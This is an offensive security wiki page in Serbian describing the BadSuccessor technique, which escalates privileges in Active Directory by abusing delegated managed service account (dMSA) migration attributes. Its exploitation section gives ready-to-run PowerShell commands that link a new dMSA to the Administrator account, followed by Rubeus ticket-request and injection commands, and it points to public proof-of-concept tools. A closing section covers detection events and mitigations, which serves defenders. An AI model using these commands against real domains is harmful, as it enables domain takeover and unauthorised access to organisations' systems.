# BadSuccessor: Eskalacija privilegija putem zloupotrebe migracije delegiranih MSA

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Delegirani upravljani servisni nalozi (**dMSA**) su naslednici **gMSA** nove generacije koji dolaze sa Windows Server 2025. Legitimni radni tok migracije omogućava administratorima da zamene *stari* nalog (korisnički, računar ili servisni nalog) sa dMSA dok transparentno čuvaju dozvole. Radni tok se izlaže putem PowerShell cmdlet-a kao što su `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration` i oslanja se na dva LDAP atributa **dMSA objekta**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* ka prethodnom (starom) nalogu.
* **`msDS-DelegatedMSAState`**       – stanje migracije (`0` = nijedno, `1` = u toku, `2` = *završeno*).

Ako napadač može da kreira **bilo koji** dMSA unutar OU i direktno manipuliše ta dva atributa, LSASS i KDC će tretirati dMSA kao *naslednika* povezanog naloga. Kada se napadač kasnije autentifikuje kao dMSA **nasleđuje sve privilegije povezanog naloga** – do **Domain Admin** ako je Administrator nalog povezan.

Ova tehnika je nazvana **BadSuccessor** od strane Unit 42 2025. U trenutku pisanja **nema dostupnog sigurnosnog zakrpa**; samo učvršćivanje dozvola OU ublažava problem.

### Preduslovi za napad

1. Nalog koji je *dozvoljen* da kreira objekte unutar **Organizacione jedinice (OU)** *i* ima barem jedan od:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** klasa objekta
* `Create Child` → **`All Objects`** (generičko kreiranje)
2. Mrežna povezanost sa LDAP i Kerberos (standardni scenario pridruženog domena / udaljeni napad).

## Enumeracija ranjivih OU

Unit 42 je objavio PowerShell pomoćni skript koji analizira bezbednosne deskriptore svake OU i ističe potrebne ACE-e:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Ispod haube, skripta pokreće paginiranu LDAP pretragu za `(objectClass=organizationalUnit)` i proverava svaki `nTSecurityDescriptor` za

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (objekat klase *msDS-DelegatedManagedServiceAccount*)

## Koraci za eksploataciju

Kada se identifikuje zapisiva OU, napad je samo 3 LDAP upisa daleko:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Nakon replikacije, napadač može jednostavno **prijaviti se** kao `attacker_dMSA$` ili zatražiti Kerberos TGT – Windows će izgraditi token *zamenjenog* naloga.

### Automatizacija

Nekoliko javnih PoC-ova obuhvata ceo radni tok uključujući preuzimanje lozinke i upravljanje karticama:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec modul – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-eksploatacija
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detekcija i Lov

Omogućite **Auditing objekata** na OU-ima i pratite sledeće Windows sigurnosne događaje:

* **5137** – Kreiranje **dMSA** objekta
* **5136** – Izmena **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Promene specifičnih atributa
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Izdavanje TGT za dMSA

Korelacija `4662` (izmena atributa), `4741` (kreiranje računa za računar/uslugu) i `4624` (naknadno prijavljivanje) brzo ističe BadSuccessor aktivnost. XDR rešenja kao što je **XSIAM** dolaze sa spremnim upitima (vidi reference).

## Ublažavanje

* Primena principa **najmanjih privilegija** – delegirati *upravljanje servisnim računima* samo pouzdanim ulogama.
* Uklonite `Create Child` / `msDS-DelegatedManagedServiceAccount` sa OU-a koji to izričito ne zahtevaju.
* Pratite događaje sa ID-evima navedenim iznad i upozorite na *non-Tier-0* identitete koji kreiraju ili uređuju dMSA.

## Takođe pogledajte

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Reference

- [Unit42 – Kada dobri računi postanu loši: Iskorišćavanje delegiranih upravljanih servisnih računa](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor modul](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
